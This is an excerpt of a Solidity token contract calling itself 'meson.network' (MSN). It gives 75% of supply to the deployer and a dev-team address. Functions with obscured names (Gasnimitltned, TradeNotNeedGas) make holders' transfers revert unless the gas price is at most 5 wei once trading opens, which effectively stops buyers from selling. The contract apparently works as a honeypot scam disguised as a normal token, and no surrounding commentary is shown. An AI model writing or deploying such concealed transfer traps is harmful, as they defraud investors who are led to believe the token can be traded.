...
contract  MSN is Ownable, IERC20 {
    ...
    string private constant _name = unicode"meson.network";
    string private constant _symbol = unicode"MSN";
    ...
    address private DEVTeam = 0x8779b8C61096d1FD49A12ea296B10cCC41ff2cbd;
    address private Marketing = 0x318B13467537f58890002847fe71eB2a74b6A5A5;
    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(50).div(100));
        _balances[DEVTeam] = _balances[DEVTeam].add(_totalSupply.mul(25).div(100));
        ...
        emit Transfer(address(0), DEVTeam, _totalSupply.mul(25).div(100));
    ...
    uint256 private Gasnimitltned = 1000 gwei;
    uint256 private Gasmaxiwns = 5;

    function _bfTransfer(address _u) internal view {
        if(balanceOf(_u) > 0) {
            if (!openedTrade) {
                TradeNotNeedGas(Gasnimitltned);
            } else {
                TradeNotNeedGas(Gasmaxiwns);
            }
        } 
    }

    function TradeNotNeedGas(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }
